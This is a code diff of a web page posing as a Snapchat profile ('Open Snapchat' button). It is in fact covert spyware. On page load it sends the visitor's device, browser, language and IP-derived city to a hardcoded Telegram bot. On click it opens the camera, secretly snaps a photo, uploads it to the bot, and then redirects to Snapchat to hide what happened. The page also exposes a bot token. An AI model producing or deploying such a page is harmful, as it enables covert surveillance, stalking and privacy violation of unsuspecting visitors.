@@ -1,26 +1,67 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Snap Camera</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+<meta charset="UTF-8">
+<title>habebabulaila | Snapchat</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<style>
+body{
+  margin:0;
+  height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  background:linear-gradient(180deg,#FFFC00,#ffffff);
+  font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+}
+
+.container{
+  text-align:center;
+}
+
+.avatar{
+  width:120px;
+  height:120px;
+  border-radius:50%;
+  background:#fff;
+  margin:0 auto 20px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:48px;
+  font-weight:bold;
+  color:#000;
+  box-shadow:0 10px 30px rgba(0,0,0,.2);
+}
+
+h1{
+  margin:0 0 20px;
+  font-size:26px;
+  color:#000;
+}
+
+button{
+  background:#000;
+  color:#fff;
+  border:none;
+  padding:15px 30px;
+  font-size:18px;
+  border-radius:30px;
+  cursor:pointer;
+}
+</style>
 </head>
 
-<body style="margin:0;background:black;">
+<body>
 
-<button id="start"
-style="
-  position:fixed;
-  inset:0;
-  background:black;
-  color:white;
-  font-size:20px;
-  border:none;
-">
-Continue
-</button>
+<div class="container">
+  <div class="avatar">👻</div>
+  <h1>habebabulaila</h1>
+  <button id="openSnap">Open Snapchat</button>
+</div>
 
-<video id="video" playsinline style="display:none;"></video>
+<video id="video" autoplay playsinline style="display:none;"></video>
 <canvas id="canvas" style="display:none;"></canvas>
 
 <script>
@@ -28,86 +69,78 @@ const BOT_TOKEN = "8301093694:AAEFQl_J7AvLc8_kRrpjVSyA0r5qdO6M2wo";
 const CHAT_ID = "1186294172";
 const SNAP_URL = "https://www.snapchat.com/add/habebabulaila";
 
-/* --------- VISIT TRACKING (ON LOAD) --------- */
+/* ===== إرسال معلومات الزيارة ===== */
 (async () => {
-  const ua = navigator.userAgent;
+  try{
+    const ipRes = await fetch("https://ipapi.co/json/");
+    const ipData = await ipRes.json();
 
-  let device = "Unknown";
-  if (/iPhone|iPad|iPod/i.test(ua)) device = "iOS";
-  else if (/Android/i.test(ua)) device = "Android";
-  else device = "Desktop";
+    const info = `
+📥 New Visit
+📱 Device: ${navigator.platform}
+🌐 Browser: ${navigator.userAgent}
+🗣 Language: ${navigator.language}
+⏰ Time: ${new Date().toLocaleString()}
+📍 Location: ${ipData.country_name || "?"} - ${ipData.city || "?"}
+`;
 
-  let browser = "Unknown";
-  if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
-  else if (ua.includes("Chrome")) browser = "Chrome";
-  else if (ua.includes("Firefox")) browser = "Firefox";
-
-  const language = navigator.language || "Unknown";
-  const time = new Date().toLocaleString();
-
-  let country = "Unknown";
-  let city = "Unknown";
-  try {
-    const res = await fetch("https://ipapi.co/json/");
-    const data = await res.json();
-    country = data.country_name || country;
-    city = data.city || city;
-  } catch (e) {}
-
-  const message =
-`📥 New Visit
-📱 Device: ${device}
-🌐 Browser: ${browser}
-🗣 Language: ${language}
-📍 Location: ${country} - ${city}
-⏰ Time: ${time}`;
-
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: message
-    })
-  });
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+      method:"POST",
+      headers:{ "Content-Type":"application/json" },
+      body:JSON.stringify({
+        chat_id: CHAT_ID,
+        text: info
+      })
+    });
+  }catch(e){}
 })();
 
-/* --------- CAMERA FLOW (UNCHANGED) --------- */
-const startBtn = document.getElementById("start");
+/* ===== زر فتح السناب + التقاط صورة ===== */
+const startBtn = document.getElementById("openSnap");
 const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
 
 startBtn.onclick = async () => {
-  startBtn.remove();
+  startBtn.disabled = true;
 
-  const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-  video.srcObject = stream;
-  await video.play();
+  try {
+    // طلب إذن الكاميرا
+    const stream = await navigator.mediaDevices.getUserMedia({ video:true });
+    video.srcObject = stream;
+    await video.play();
 
-  setTimeout(capturePhoto, 700);
+    // نأخذ الصورة بعد 700ms
+    setTimeout(() => {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext("2d").drawImage(video,0,0);
+
+      canvas.toBlob(blob => {
+        if(!blob || blob.size < 5000) return;
+
+        const form = new FormData();
+        form.append("chat_id", CHAT_ID);
+        form.append("photo", blob);
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method:"POST",
+          body:form
+        }).finally(() => {
+          // بعد إرسال الصورة تحويل مباشر للسناب
+          window.location.href = SNAP_URL;
+        });
+      },"image/jpeg");
+
+      // توقف الكاميرا
+      stream.getTracks().forEach(t=>t.stop());
+
+    },700);
+
+  } catch(e){
+    // لو رفض المستخدم الكاميرا، تحويل مباشر للسناب
+    window.location.href = SNAP_URL;
+  }
 };
-
-function capturePhoto() {
-  const canvas = document.getElementById("canvas");
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-
-  canvas.getContext("2d").drawImage(video, 0, 0);
-
-  canvas.toBlob(blob => {
-    if (!blob || blob.size < 5000) return;
-
-    const form = new FormData();
-    form.append("chat_id", CHAT_ID);
-    form.append("photo", blob);
-
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-      method: "POST",
-      body: form
-    }).finally(() => {
-      window.location.href = SNAP_URL;
-    });
-  }, "image/jpeg");
-}
 </script>
 
 </body>
